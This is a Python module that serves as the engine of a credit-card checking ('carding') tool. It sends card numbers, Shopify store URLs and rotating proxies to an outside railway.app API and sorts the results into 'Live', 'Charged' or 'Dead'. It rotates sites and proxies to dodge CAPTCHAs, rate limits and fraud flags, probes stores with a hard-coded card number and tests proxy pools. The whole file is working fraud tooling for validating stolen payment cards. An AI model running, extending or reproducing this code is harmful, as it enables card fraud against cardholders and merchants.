"""
check_engine.py — Card checking engine + proxy utilities + universal proxy parser
API-BASED VERSION
"""
import asyncio
import aiohttp
import random
import os
import re
import httpx
import time
from typing import Optional

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🎯 API ENDPOINTS — rotate through these automatically
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_URLS = [
    "https://web-production-0919d.up.railway.app/shopify",
    "https://web-production-0919d.up.railway.app/shopify",
    "https://web-production-0919d.up.railway.app/shopify",
]

_API_TIMEOUT = httpx.Timeout(connect=4.0, read=25.0, write=4.0, pool=8.0)

# Short per-request timeout used when probing whether a site is alive. Kept
# separate from _API_TIMEOUT so real card checks keep their longer budget.
_SITE_PROBE_TIMEOUT = 10.0

# Hard budget for a single proxy liveness probe. All candidate URLs are raced
# concurrently against this, so the worst case is ~this value rather than
# 3 x timeout as it was before.
_PROXY_TEST_TIMEOUT = 6.0

_http_client: httpx.AsyncClient | None = None
_client_lock = asyncio.Lock()

_session_bad_sites: set[str] = set()
_bad_site_lock = asyncio.Lock()

async def mark_site_bad(site: str):
    async with _bad_site_lock:
        _session_bad_sites.add(site)

def is_site_bad(site: str) -> bool:
    return site in _session_bad_sites


def clear_session_bad_sites():
    global _session_bad_sites
    _session_bad_sites = set()


async def _get_client() -> httpx.AsyncClient:
    global _http_client
    async with _client_lock:
        if _http_client is None or _http_client.is_closed:
            _http_client = httpx.AsyncClient(
                timeout=_API_TIMEOUT,
                limits=httpx.Limits(
                    max_connections=2000,
                    max_keepalive_connections=500,
                    keepalive_expiry=60.0,
                ),
            )
    return _http_client


def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None, site=''):
    # NOTE: the parameter is named ``time`` for backwards compatibility with
    # callers, but it no longer shadows the ``time`` module inside this body.
    return {
        'status':      status,
        'message':     message,
        'card':        card,
        'gateway':     gateway,
        'price':       price,
        'receipt_url': receipt_url,
        'retry':       retryable,
        'proxy':       proxy,
        'time':        time,
        'site':        site,
    }


_PROXY_ERR_SIGNALS = (
    'connection timed out', 'connection timeout', 'timed out',
    'proxy error', 'proxy dead', 'proxy_error',
    'eof occurred', 'remote end closed', 'failed to perform',
    'connection refused', 'connect tunnel failed',
)


def _is_proxy_err(msg: str) -> bool:
    m = (msg or '').lower()
    return any(s in m for s in _PROXY_ERR_SIGNALS)


def _normalize_api_url(url: str) -> str:
    url = url.strip().rstrip("/")
    if not url.endswith("/shopify"):
        url = url + "/shopify"
    return url


# Normalize + de-duplicate once at import time. The old retry loop compared
# raw URLs against normalized ones, so ``tried`` never matched and the same
# endpoint could be hit on every attempt.
API_URLS = list(dict.fromkeys(_normalize_api_url(u) for u in API_URLS))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔌 UNIVERSAL PROXY PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _is_valid_host(host: str) -> bool:
    if not host or len(host) < 4:
        return False
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
        octets = host.split('.')
        return all(0 <= int(o) <= 255 for o in octets)
    if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]*\.[a-zA-Z]{2,}$', host):
        return True
    return False


def _is_valid_port(port: str) -> bool:
    return port.isdigit() and 1 <= int(port) <= 65535


def _proxy_to_url(proxy: str) -> str:
    if not proxy:
        return ''
    p = proxy.strip()
    if any(x in p.lower() for x in ('myshopify', '.com/', 'https:///', 'http:///')):
        return ''
    protocol = 'http'
    for prefix in ('http://', 'https://', 'socks5://', 'socks4://'):
        if p.lower().startswith(prefix):
            protocol = prefix[:-3]
            p = p[len(prefix):]
            break
    p = p.strip('/')
    if '@' in p:
        auth, host_part = p.rsplit('@', 1)
        if ':' in host_part:
            host, port = host_part.rsplit(':', 1)
            if _is_valid_host(host) and _is_valid_port(port):
                return f'{protocol}://{auth}@{host}:{port}'
        return ''
    parts = p.split(':')
    if len(parts) == 2:
        host, port = parts
        if _is_valid_host(host) and _is_valid_port(port):
            return f'{protocol}://{host}:{port}'
        return ''
    if len(parts) == 4:
        a, b, c, d = parts
        if _is_valid_host(a) and _is_valid_port(b):
            return f'{protocol}://{c}:{d}@{a}:{b}'
        if _is_valid_host(c) and _is_valid_port(d):
            return f'{protocol}://{a}:{b}@{c}:{d}'
        return ''
    space_parts = p.split()
    if len(space_parts) == 4:
        a, b, c, d = space_parts
        if _is_valid_host(c) and _is_valid_port(d):
            return f'{protocol}://{a}:{b}@{c}:{d}'
        if _is_valid_host(a) and _is_valid_port(b):
            return f'{protocol}://{c}:{d}@{a}:{b}'
    return ''


def _sanitize_proxy(proxy: str) -> str:
    if not proxy:
        return ''
    p = proxy.strip()
    if any(x in p.lower() for x in ('myshopify', '.com/', 'https:///', 'http:///')):
        return ''
    if ':///' in p:
        p = p.replace(':///', '://')
    return p


def _strip_protocol(proxy: str) -> str:
    p = proxy.strip()
    for prefix in ("http://", "https://", "socks5://", "socks4://"):
        if p.startswith(prefix):
            p = p[len(prefix):]
    return p


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🎯 API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _normalize_shop_url(shop_url: str) -> str:
    if not shop_url:
        return ""
    s = shop_url.strip()
    s = re.sub(r'^https:\/+', 'https://', s, flags=re.I)
    s = re.sub(r'^http:\/+', 'http://', s, flags=re.I)
    if not re.match(r'^https?://', s, flags=re.I):
        s = 'https://' + s.lstrip('/')
    try:
        from urllib.parse import urlparse
        p = urlparse(s)
        if not p.netloc:
            return ""
        return f"{(p.scheme or 'https').lower()}://{p.netloc.lower()}"
    except Exception:
        return ""


async def _call_api(shop_url: str, card: str, proxy_raw: str,
                    timeout: float | None = None, attempts: int = 3) -> dict:
    c = await _get_client()
    clean_proxy = _sanitize_proxy(proxy_raw)
    if not clean_proxy:
        return _make_result(card, 'Dead', message="Invalid proxy format", retryable=True)
    proxy_url = _proxy_to_url(clean_proxy)
    if not proxy_url:
        return _make_result(card, 'Dead', message="Invalid proxy format", retryable=True)
    shop_url = _normalize_shop_url(shop_url)
    if not shop_url:
        return _make_result(card, 'Dead', message="Invalid site URL", retryable=True)

    params = {
        "site":  shop_url,
        "cc":    card,
        "proxy": _strip_protocol(clean_proxy),
    }

    last_error = None
    tried = set()
    # A site probe passes attempts=1 + a short timeout. Card checks keep the
    # default 3 attempts against the full read timeout.
    n_attempts = max(1, int(attempts or 3))

    for attempt in range(n_attempts):
        candidates = [u for u in API_URLS if u not in tried]
        if not candidates:
            break
        api_url = _normalize_api_url(random.choice(candidates))
        tried.add(api_url)
        try:
            if timeout:
                r = await c.get(api_url, params=params,
                                timeout=httpx.Timeout(timeout, connect=min(timeout, 5.0)))
            else:
                r = await c.get(api_url, params=params)
            if r.status_code != 200:
                last_error = f"HTTP {r.status_code}"
                if attempt < n_attempts - 1:
                    await asyncio.sleep(0.15 * (attempt + 1))
                continue
            data = r.json()
            raw_response = str(data.get("Response") or data.get("RawResponse") or "")
            gateway      = str(data.get("Gateway") or "Shopify Payments")
            price        = str(data.get("Price") or "-")
            if " [" in price:
                price = price.split(" [")[0]

            # ═══════════════════════════════════════════════════════════════
            #  ONLY RESPONSE + PRICE MATTER — Status field is IGNORED
            # ═══════════════════════════════════════════════════════════════
            resp_up = raw_response.upper()

            # ── 0. CAPTCHA — never a terminal answer ──
            # CAPTCHA_REQUIRED means the site's risk engine wants a challenge.
            # It is a site/proxy-level condition, not a card verdict, so we
            # quarantine the site for the rest of the session and force a
            # retry through a different site + proxy instead of surfacing it.
            if any(k in resp_up for k in ("CAPTCHA_REQUIRED", "CAPTCHA METADATA", "CAPTCHA_METADATA_MISSING", "HCAPTCHA")):
                await mark_site_bad(shop_url)
                return _make_result(card, 'Dead',
                                    message="CAPTCHA_REQUIRED",
                                    retryable=True, proxy=clean_proxy,
                                    site=shop_url)

            # ── 1. PROXY ERROR (retry) ──
            if any(k in resp_up for k in (
                "PROXY", "CONNECTION TIMED OUT", "TIMED OUT", "TIMEOUT",
                "EOF OCCURRED", "REMOTE END CLOSED", "CONNECTION REFUSED",
                "CONNECT TUNNEL FAILED", "FAILED TO PERFORM",
            )):
                return _make_result(card, 'Dead',
                                    message=raw_response,
                                    retryable=True, proxy=clean_proxy,
                                    site=shop_url)

            # ── 2. SITE / STEP ERROR (retry) ──
            if any(k in resp_up for k in (
                  "Site is password protected", "PAYMENTS_TERMS_CHANGED", "Unknown Response: INVALID_PAYMENT_METHOD", "INVALID_PAYMENT_METHOD", "Unknown Response: PROCESSING_ERROR", "PROCESSING_ERROR", "3DS_AUTHENTICATION", "RISK_REJECTED", "TERMS_REQUIRED",
  "PAYMENTS_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN", "FRAUD_SUSPECTED", "INCORRECT_ZIP",
  "Response: Unknown Response: No query string was present", "INVALID_PURCHASE_TYPE", "WAITING_PENDING_TERMS",
  "No query string was present", "PAYMENTS_INVALID_PAYMENT_ATTRIBUTES", "TIMEOUT", "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE",
  "DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN", "Throttled", "VALIDATION_CUSTOM",
  "MERCHANDISE_GIFT_CARD_PRICE_MUST_BE_GREATER_THAN_ZERO", "SORRY_YOU_CANNOT_VISIT_OUR_STORE_FROM_Y", "SITE_CURRENCY_MISMATCH", "SITE_PAYMENT_AMOUNT_MISMATCH",
    "STILL_PROCESSING", "<b>Site Error! Status: 404</b>", " Site is password protected",
"Site Error! GraphQL status 409", 
"INVENTORY_RESERVATION_FAILURE", "Site Error! GraphQL status 400", "Response: Unknown Response: PAYMENTS_CREDIT_CARD_SESSION_ID", "Unknown Response: PAYMENTS_CREDIT_CARD_SESSION_ID",
"PAYMENTS_CREDIT_CARD_SESSION_ID", "Response: Unknown Response: HTTP_ERROR", "Unknown Response: HTTP_ERROR",
"HTTP_ERROR", "Response: Unknown Response: proposal round 1: proposal HTTP 415", "Unknown Response: PAYMENTS_CREDIT_CARD_SESSION_ID",
"proposal round 1: proposal HTTP 415", "Response: Unknown Response: CHARGE_UNVERIFIED", "Unknown Response: CHARGE_UNVERIFIED", "CHARGE_UNVERIFIED", "SITE_PAYMENT_AMOUNT_MISMATCH", "SITE_CURRENCY_MISMATCH",
"<b>Invalid proxy format</b>", "Invalid proxy format", "Site Error (retried 50x): Site Error! GraphQL status 402",
"Site Error! GraphQL status 402",
 "Site Error! GraphQL status 401", "Site Error! GraphQL status 402",
"Site Error! GraphQL status 403", "Site Error! GraphQL status 404",
"MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION",
"REQUIRED_ARTIFACTS_UNAVAILABLE", "MERCHANDISE_OUT_OF_STOCK",
"Throttled", "RATE_LIMITED", "INVENTORY_RESERVATION_FAILURE",
 "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE",
 "DELIVERY_WRONG_NUMBER_OF_DELIVERY_LINES",
 "TAX_TAX_INCLUSIVITY_MISMATCH", "DEAD_SITE",
 "DELIVERY_COMPANY_REQUIRED",
 "Site Error! Status: 409",
  "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
  "<b>Site Error! Status: 409</b>",
   "DECISION_RULE_BLOCK", "ARTIFACT_DISSATISFACTION",
   "<b>Site Error! Status: 402</b>", "No valid payment method found",
   "Proxy Error: Connection Error: 𝓝𝓐𝓡𝓤𝓣𝓞-x-shopify-production-e9ef.up.railway.app/shopify", "Proxy Error", "Proxy Error: Connection Error: insaneee7xshopiify-production.up.railway.app/shopify", "Proxy Error: Connection Error: insaneee7xshopiify-production-38dc.up.railway.app", "Proxy Error: Connection Error: 𝓝𝓐𝓡𝓤𝓣𝓞-x-shopify-production-6ead.up.railway.app/shopify", "Proxy Error: Connection Error: insaneee7xshopiify-production.up.railway.app/shopify", "CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE", "Proxy Error: Connection Error: https://insaneee7xshopiify-production-5deb.up.railway.app/shopify", "Proxy Error: Connection Error: https://insaneee7xshopiify-production-51a7.up.railway.app/shopify", "TOKEN_FAIL",
    "PAYMENTS_METHOD", "no shipping handle obtained", "validation_custom", "decision_rule_block",
    "merchandise_expected_price_mismatch",
    "generic_error", "generic error", "error:", "r4 token empty", "payment method is not shopify!", "r2 id empty",
    "product not found", "hcaptcha detected", "tax ammount empty",
    "invalid json in submit response", "invalid json response", "unknown result", "site error! status: 401", "payments_credit_card_generic",
    "payments_positive_amount_expected", "inventoryreservationfailure",
    "del ammount empty", "product id is empty", "py id empty",
    "clinte token", "hcaptcha_detected", "receipt_empty", "na",
    "site error! status: 429", "site requires login!", "failed to get token",
    "no valid products", "not shopify!", "site not supported for now!",
    "connection error", "connection error!", "error processing card",
    "504", "server error", "client error", "failed",
    "token not found", "invalid_response", "resolve", "item", "curl error",
    "could not resolve host", "connect tunnel failed",
    "timeout", "proxy error", "http 429", "429", "too many requests",
    "payment method not available", "site not supported", "captcha_required",
    "payments_credit_card_brand_not_supported", "delivery_delivery_line_detail_changed",
                "delivery_strategy_conditions_not_satisfied",
"DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED",
    "delivery_no_delivery_strategy_available_for_mercha", "delivery_no_delivery_strategy_available",
    "delivery_address", "artifacts on the seller proposal", "amount_too_small", "<b>Proxy Dead!</b>", 
    "tokenization blocked: 403 Forbidden (proxy/IP blocked)", "stableId not found in checkout HTML", "UNKNOWN", 
    "checkout GET", "NO_PRODUCT_FOUND", "found 1 products, all 1 checkouts returned site errors (CAPTCHA_METADATA_MISSING) (9.1s)",
     "TAX_NEW_TAX_MUST_BE_ACCEPTED", "No receipt in submit response (type: TooManyRequests)",
    "site error! status: 404", "site error! status: 500", "site error! status: 402", 
    "site error! status: 502", "site error! 503", "site error! status: 503",
    "site not supported for now!", "site not supported", "connection error", "connection error!",
    "error processing card", "failed to get token", "failed to get checkout", 
    "failed to add to cart", "site overloaded", "site rate limited",
    "failed to get session token", "unable to get payment token", "no valid products", 
    "site error! status: 403", "payment method is not shopify!", "not shopify!", 
    "site error! status: 401", "site requires login!",
    "site error! status: 429", "cart failed with status 429", "returned status 429",
    "too many requests", "http 429", "429",
    "validation_custom", "payments_payment_flexibility_terms_id_mismatch",
    "timeout", "http error", "json", "proxy", "curl error", "could not resolve",
    "connect tunnel failed", "max retries", "GENERIC_ERROR",
    "invalid json in submit response", "invalid json response", "unknown result", "payments_credit_card_generic",
    "payments_positive_amount_expected", "inventoryreservationfailure", "MERCHANDISE_EXPECTED_PRICE_MISMATCH", "Unknown Response: MERCHANDISE_EXPECTED_PRICE_MISMATCH",    
    # Step failures (Site Broken/Dead)
    "step 1 failed", "step 0 failed", "step 2 failed", "step 3 failed", "step 4 failed",
    "step 5 failed", "step 6 failed", "step 7 failed", "step 9 failed", "step 10 failed",
    "missing stableid", "missing buildid", "missing sourcetoken",
    "could not extract private_access_token",
    "could not find actions js url",
    "missing proposal", "missing submit id",
    "retryable: inventory reservation failure",
    "exceeded 30 poll attempts",
    "could not extract queuetoken",
    "could not extract identification signature",
    "could not extract session id",
    "could not extract delivery handle",
    "could not extract signedhandles",
    "could not extract shipping amount",
    "could not extract total amount",
    "could not extract receiptid",
    "could not extract sessiontoken",
    "errstoreincompatible", "errmissingreceiptid", "fetch products",
    "payments_credit_card_brand_not_supported", "delivery_delivery_line_detail_changed",
    "delivery_no_delivery_strategy_available_for_mercha", "delivery_address", 
    "Unknown Response: Cart failed with status 400", "Cart failed with status 400", "Unknown Response: No valid payment method found", "No valid payment method found", 
    "Response: Unknown Response: PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT","PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", "Unknown Response: no shipping handle obtained", "no shipping handle obtained", "Unknown Response: NO_PRODUCT_FOUND", "NO_PRODUCT_FOUND", "Unknown Response: session token not found in HTML", "session token not found in HTML" , "TAX_NEW_TAX_MUST_BE_ACCEPTED",
        "Unknown Response: TAX_NEW_TAX_MUST_BE_ACCEPTED", "Unknown Response: DELIVERY_INVALID_POSTAL_CODE_FOR_COUNTRY","DELIVERY_INVALID_POSTAL_CODE_FOR_COUNTRY", "Unknown Response: Error parsing submit: value", "Error parsing submit: value", "Unknown Response: FRAUD_SUSPECTED", "FRAUD_SUSPECTED", "DECISION_RULE_BLOCK", "Unknown Response: Cart failed with status 422", "Unknown Response: DECISION_RULE_BLOCK", "Unknown Response: ARTIFACT_DISSATISFACTION", "ARTIFACT_DISSATISFACTION"

            )):
                return _make_result(card, 'Dead',
                                    message=raw_response,
                                    retryable=True, proxy=clean_proxy,
                                    site=shop_url)

            # ── 3. DECLINED (exact match) ──
            declined_exact = (
                "CARD_DECLINED", "PAYMENT_FAILED", "MISMATCHED_BILL",
                "DO_NOT_HONOR", "PAYMENT_METHOD_NOT_AVAILABLE",
                "CARD_EXPIRED", "INVALID_CARD", "GENERIC_ERROR",
                "INVALID_CVC", "INCORRECT_CVC", "INCORRECT_ZIP",
                "CARD NOT SUPPORTED", "CARD_NOT_SUPPORTED",
                "SITE_REQUIRES_LOGIN", "SITE NOT SUPPORTED",
            )
            if any(k in resp_up for k in declined_exact):
                return _make_result(card, 'Dead',
                                    message=raw_response or "Card Declined",
                                    price=price, gateway=gateway,
                                    proxy=clean_proxy, retryable=False,
                                    site=shop_url)

            # ── 4. LIVE (insufficient funds, 3ds) ──
            live_exact = (
                "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
                "PAYMENTS_INSUFFICIENT_FUNDS", "NOT ENOUGH FUNDS",
                "NOT_ENOUGH_FUNDS", "LOW BALANCE", "LOW_BALANCE",
                "3DS_REQUIRED", "OTP_REQUIRED", "AUTHENTICATION_REQUIRED",
                "AUTHENTICATION REQUIRED", "3D SECURE", "OTP REQUIRED",
                "INSUFFICIENT", "NSF", "FUNDS",
            )
            if any(k in resp_up for k in live_exact):
                return _make_result(card, 'Live',
                                    message=raw_response or "Card Live",
                                    price=price, gateway=gateway,
                                    proxy=clean_proxy, site=shop_url)

            # ── 5. CHARGED (order placed / success) ──
            charged_exact = (
                "ORDER_PAID", "ORDER_PLACED", "CHARGED",
                "THANK YOU", "PAYMENT_SUCCESSFUL", "PAYMENT SUCCESSFUL",
                "CAPTURED_SUCCESSFULLY", "PAYMENT CAPTURED",
                "SUCCESSFULLY CHARGED",
            )
            if any(k in resp_up for k in charged_exact):
                return _make_result(card, 'Charged',
                                    message=raw_response or "Payment captured",
                                    price=price, gateway=gateway,
                                    receipt_url=data.get("ReceiptUrl", ""),
                                    proxy=clean_proxy, site=shop_url)

            # ── 6. DEFAULT → Declined (safe) ──
            return _make_result(card, 'Dead',
                                message=raw_response or "Unknown",
                                price=price, gateway=gateway,
                                proxy=clean_proxy, retryable=False,
                                site=shop_url)

        except httpx.TimeoutException:
            last_error = "API timeout"
            continue
        except httpx.ConnectError:
            last_error = "API unreachable"
            continue
        except Exception as e:
            last_error = str(e)[:80]
            continue

    return _make_result(card, 'Dead',
                        message=f"All APIs failed: {last_error or 'unknown'}",
                        retryable=True)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🧪 SITE CHECK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def test_site(site: str, proxy: str) -> dict:
    test_card = "4828120084794435|07|2029|731"
    try:
        # Liveness probe only: one attempt with a short timeout. Previously this
        # ran the full card-check path (3 attempts x 25s read timeout), so a
        # batch of 360 sites could take the better part of an hour.
        result = await _call_api(site, test_card, proxy,
                                 timeout=_SITE_PROBE_TIMEOUT, attempts=1)
        if result['status'] in ('Charged', 'Approved'):
            return {'site': site, 'status': 'alive'}
        msg = str(result.get('message') or '')
        if msg and 'API' not in msg and 'proxy' not in msg.lower():
            return {'site': site, 'status': 'alive'}
        return {'site': site, 'status': 'dead', 'msg': msg[:100]}
    except Exception as e:
        msg = str(e)[:80]
        if 'step' in msg.lower():
            return {'site': site, 'status': 'step_error', 'msg': msg}
        return {'site': site, 'status': 'dead', 'msg': msg}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔁 MAIN CARD CHECKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')

    last_err = 'Unknown error'
    # Honour the caller's max_retries instead of ignoring it.
    MAX_TRIES = max(1, int(max_retries or 2)) * 2
    failed_sites = set()

    for attempt in range(MAX_TRIES):
        # Prefer sites that have not failed, and skip any site the session
        # has quarantined (captcha / dead). Only fall back to the full list
        # once every candidate has been excluded.
        available = [s for s in sites
                     if s not in failed_sites and not is_site_bad(s)]
        if not available:
            available = [s for s in sites if s not in failed_sites] or list(sites)
        shop_url  = random.choice(available)
        proxy_raw = (start_proxy if attempt == 0 and start_proxy else random.choice(proxies))

        clean_proxy = _sanitize_proxy(proxy_raw)
        if not clean_proxy:
            last_err = "Invalid proxy format (skipped)"
            continue

        try:
            result = await _call_api(shop_url, card, clean_proxy)
        except Exception as e:
            last_err = str(e)
            failed_sites.add(shop_url)
            await asyncio.sleep(0.05)
            continue

        if result['status'] in ('Charged', 'Approved'):
            result['proxy'] = clean_proxy
            return result

        if result['status'] == 'Dead' and not result.get('retry'):
            return result

        last_err = result.get('message', 'Retryable error')
        # Site threw a captcha → quarantine it for the rest of the session.
        if 'CAPTCHA' in str(last_err).upper():
            await mark_site_bad(shop_url)
        if _is_proxy_err(last_err):
            await asyncio.sleep(0.05)
            continue
        if 'step 0' in last_err.lower() or 'no product' in last_err.lower():
            failed_sites.add(shop_url)
        await asyncio.sleep(0.05)

    _log_error_card(card, last_err)
    return _make_result(card, 'Dead', last_err)


def clear_error_log():
    try:
        open("error.txt", 'w').close()
    except Exception:
        pass


def _log_error_card(card: str, reason: str):
    try:
        with open("error.txt", 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {reason[:100]}\n")
    except Exception:
        pass


async def test_proxy(proxy: str) -> dict:
    proxy_url = _proxy_to_url(proxy)
    if not proxy_url:
        return {'proxy': proxy, 'status': 'dead', 'error': 'Invalid format'}

    test_urls = ('http://api.ipify.org', 'http://icanhazip.com', 'http://httpbin.org/ip')

    async def _probe(session, url):
        async with session.get(url, proxy=proxy_url, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=_PROXY_TEST_TIMEOUT)) as r:
            if r.status == 200:
                return True
        return False

    try:
        # Reuse one session instead of building (and discarding) a connector per
        # proxy — that was the dominant cost with large pools.
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=0),
            timeout=aiohttp.ClientTimeout(total=_PROXY_TEST_TIMEOUT),
        ) as s:
            tasks = [asyncio.create_task(_probe(s, u)) for u in test_urls]
            # All three URLs race at once; first 200 wins and the rest are
            # cancelled. Previously they ran one after another, so a dead proxy
            # could sit for 3 x 15s and the tail of every batch looked frozen.
            done, pending = await asyncio.wait(tasks, timeout=_PROXY_TEST_TIMEOUT + 2.0,
                                               return_when=asyncio.FIRST_COMPLETED)
            for t in pending:
                t.cancel()
            for t in pending:
                try:
                    await t
                except (asyncio.CancelledError, Exception):
                    pass
            if any(t.done() and not t.cancelled() and t.exception() is None and t.result()
                   for t in done):
                return {'proxy': proxy, 'status': 'alive'}
        return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}


async def get_proxy_ip(proxy: str) -> str | None:
    proxy_url = _proxy_to_url(proxy)
    if not proxy_url or proxy_url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except Exception:
        pass
    return None
